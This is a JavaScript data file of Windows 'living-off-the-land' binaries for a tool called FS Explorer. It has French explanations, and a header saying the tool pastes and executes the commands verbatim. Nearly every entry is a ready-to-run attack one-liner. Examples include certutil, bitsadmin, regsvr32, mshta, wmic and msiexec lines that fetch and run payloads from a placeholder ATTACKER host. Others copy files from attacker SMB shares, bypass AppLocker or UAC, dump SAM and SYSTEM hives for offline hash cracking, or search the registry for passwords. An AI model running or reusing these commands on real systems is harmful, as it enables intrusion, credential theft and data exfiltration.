/* Curated LOLBAS subset for the FS Explorer module (Windows targets).
   Source: https://lolbas-project.github.io/  -- signed built-in
   binaries abused to execute code, download files, copy files, or dump
   secrets, i.e. the ones worth flagging when they turn up in a Windows
   listing or a services/tasks enumeration.

   Shape:  lolbasData["<basename lowercased, with .exe>"] = {
     tags: ["execute","download","copy","dump", ...],
     lines: [ { cmd, why } ],           // ATTACKER / paths are placeholders
     note: "<explication FR, une phrase>"
   }
   Matched case-insensitively on the file's basename. The commands are
   references -- FS Explorer pastes/executes them verbatim after the
   amber acknowledgement; substitute the real host/paths yourself. */

const lolbasData = {
  "certutil.exe": {
    tags: ["download", "decode"],
    lines: [
      { cmd: "certutil.exe -urlcache -split -f http://ATTACKER/x.exe C:\\Windows\\Temp\\x.exe", why: "Télécharge un fichier depuis une URL." },
      { cmd: "certutil.exe -decode payload.b64 payload.exe", why: "Décode du base64 (ex. un binaire exfiltré en texte)." },
    ],
    note: "certutil sait télécharger et (dé)coder des fichiers, en contournant certaines protections.",
  },
  "bitsadmin.exe": {
    tags: ["download", "execute"],
    lines: [
      { cmd: 'bitsadmin /transfer j /download /priority normal http://ATTACKER/x.exe C:\\Windows\\Temp\\x.exe', why: "Télécharge via le service BITS." },
      { cmd: 'bitsadmin /create j & bitsadmin /addfile j http://ATTACKER/x.exe C:\\Windows\\Temp\\x.exe & bitsadmin /SetNotifyCmdLine j C:\\Windows\\Temp\\x.exe NULL & bitsadmin /resume j', why: "Télécharge puis exécute à la fin du transfert." },
    ],
    note: "Transfert de fichiers via BITS, avec exécution possible à la complétion.",
  },
  "regsvr32.exe": {
    tags: ["execute", "download", "bypass"],
    lines: [
      { cmd: "regsvr32.exe /s /n /u /i:http://ATTACKER/x.sct scrobj.dll", why: "Exécute un scriptlet distant (contourne AppLocker par défaut)." },
    ],
    note: "Exécute un scriptlet COM local ou distant sans écrire de fichier .exe.",
  },
  "rundll32.exe": {
    tags: ["execute"],
    lines: [
      { cmd: 'rundll32.exe shell32.dll,ShellExec_RunDLL "cmd.exe" "/c whoami"', why: "Lance une commande via shell32." },
      { cmd: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe")', why: "Exécute du JScript en ligne." },
    ],
    note: "Exécute des fonctions exportées de DLL, du JScript, ou des .cpl.",
  },
  "mshta.exe": {
    tags: ["execute", "download"],
    lines: [
      { cmd: "mshta.exe http://ATTACKER/x.hta", why: "Exécute une application HTML distante." },
      { cmd: 'mshta.exe vbscript:Execute("CreateObject(\\"Wscript.Shell\\").Run(\\"cmd.exe\\"):close")', why: "Exécute du VBScript en ligne." },
    ],
    note: "Exécute des .hta (HTML + script) locaux ou distants.",
  },
  "msbuild.exe": {
    tags: ["execute", "bypass"],
    lines: [
      { cmd: "msbuild.exe C:\\Windows\\Temp\\x.csproj", why: "Compile et exécute une tâche inline (C#) — contourne AppLocker." },
    ],
    note: "Un projet MSBuild peut contenir une tâche inline qui exécute du C# arbitraire.",
  },
  "installutil.exe": {
    tags: ["execute", "bypass"],
    lines: [
      { cmd: "installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Temp\\x.dll", why: "Exécute le code de désinstallation d'un assembly .NET." },
    ],
    note: "Exécute le code des méthodes Install/Uninstall d'une DLL .NET.",
  },
  "regasm.exe": {
    tags: ["execute", "bypass"],
    lines: [{ cmd: "regasm.exe /U C:\\Windows\\Temp\\x.dll", why: "Exécute le code d'enregistrement/désenregistrement COM." }],
    note: "Comme InstallUtil : exécute du code .NET via l'enregistrement COM.",
  },
  "regsvcs.exe": {
    tags: ["execute", "bypass"],
    lines: [{ cmd: "regsvcs.exe C:\\Windows\\Temp\\x.dll", why: "Exécute le code d'enregistrement d'un assembly." }],
    note: "Comme RegAsm.",
  },
  "cmstp.exe": {
    tags: ["execute", "uac-bypass"],
    lines: [{ cmd: "cmstp.exe /ni /s C:\\Windows\\Temp\\x.inf", why: "Exécute une commande via un fichier INF (contournement UAC connu)." }],
    note: "Le profil de connexion (.inf) peut lancer une commande arbitraire.",
  },
  "wmic.exe": {
    tags: ["execute", "download"],
    lines: [
      { cmd: 'wmic.exe process call create "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt"', why: "Crée un processus." },
      { cmd: 'wmic.exe os get /format:"http://ATTACKER/x.xsl"', why: "Charge et exécute un XSL distant (JScript)." },
    ],
    note: "Création de processus et exécution de XSL distants.",
  },
  "forfiles.exe": {
    tags: ["execute"],
    lines: [{ cmd: "forfiles.exe /p C:\\Windows\\System32 /m notepad.exe /c cmd.exe", why: "Lance une commande pour chaque fichier trouvé." }],
    note: "Peut exécuter une commande arbitraire via /c.",
  },
  "pcalua.exe": {
    tags: ["execute"],
    lines: [{ cmd: "pcalua.exe -a C:\\Windows\\Temp\\x.exe", why: "Lance un programme (assistant de compatibilité)." }],
    note: "Lance un exécutable ou une DLL arbitraire.",
  },
  "msiexec.exe": {
    tags: ["execute", "download"],
    lines: [{ cmd: "msiexec.exe /q /i http://ATTACKER/x.msi", why: "Installe (et exécute) un MSI distant." }],
    note: "Installe un paquet MSI local ou distant, qui peut exécuter des actions personnalisées.",
  },
  "cscript.exe": {
    tags: ["execute"],
    lines: [{ cmd: "cscript.exe //nologo C:\\Windows\\Temp\\x.vbs", why: "Exécute un script VBScript/JScript." }],
    note: "Interpréteur de scripts Windows (console).",
  },
  "wscript.exe": {
    tags: ["execute"],
    lines: [{ cmd: "wscript.exe C:\\Windows\\Temp\\x.vbs", why: "Exécute un script VBScript/JScript (fenêtré)." }],
    note: "Interpréteur de scripts Windows (GUI).",
  },
  "hh.exe": {
    tags: ["execute", "download"],
    lines: [{ cmd: "hh.exe http://ATTACKER/x.hta", why: "L'aide HTML peut charger une page distante avec script." }],
    note: "hh.exe (aide compilée .chm) peut exécuter du HTA/script.",
  },
  "print.exe": {
    tags: ["copy"],
    lines: [{ cmd: "print.exe /D:C:\\Windows\\Temp\\out.exe C:\\path\\in.exe", why: "Copie un fichier via l'API d'impression." }],
    note: "Détourné pour copier un fichier (y compris depuis un partage).",
  },
  "esentutl.exe": {
    tags: ["copy"],
    lines: [{ cmd: "esentutl.exe /y C:\\path\\in.exe /d C:\\Windows\\Temp\\out.exe /o", why: "Copie de fichier, gère les ADS et les chemins UNC." }],
    note: "Copie de fichiers, y compris depuis \\\\ATTACKER\\share ou un flux ADS.",
  },
  "extrac32.exe": {
    tags: ["copy"],
    lines: [{ cmd: "extrac32.exe /Y /C C:\\path\\in.exe C:\\Windows\\Temp\\out.exe", why: "Copie de fichier via l'extracteur CAB." }],
    note: "Détourné pour copier un fichier.",
  },
  "findstr.exe": {
    tags: ["copy", "download"],
    lines: [{ cmd: 'findstr.exe /V /L cnrcteg \\\\ATTACKER\\share\\in.exe > C:\\Windows\\Temp\\out.exe', why: "Recopie un fichier (y compris depuis un partage SMB)." }],
    note: "Peut lire un fichier distant (partage) et le réécrire localement.",
  },
  "reg.exe": {
    tags: ["dump"],
    lines: [
      { cmd: "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.hive & reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive", why: "Sauvegarde les ruches SAM/SYSTEM (extraction de hashes hors-ligne)." },
      { cmd: "reg.exe query HKLM /f password /t REG_SZ /s", why: "Cherche des mots de passe dans le registre." },
    ],
    note: "Avec les droits : dump des ruches SAM/SYSTEM/SECURITY pour secretsdump.",
  },
  "expand.exe": {
    tags: ["copy"],
    lines: [{ cmd: "expand.exe \\\\ATTACKER\\share\\in.exe C:\\Windows\\Temp\\out.exe", why: "Copie/décompresse un fichier (y compris depuis un partage)." }],
    note: "Détourné pour récupérer un fichier depuis un partage.",
  },
  "makecab.exe": {
    tags: ["archive"],
    lines: [{ cmd: "makecab.exe C:\\path\\secret.txt C:\\Windows\\Temp\\s.cab", why: "Compresse un fichier (utile pour l'exfiltration)." }],
    note: "Compression CAB, souvent utilisé pour préparer une exfiltration.",
  },
};
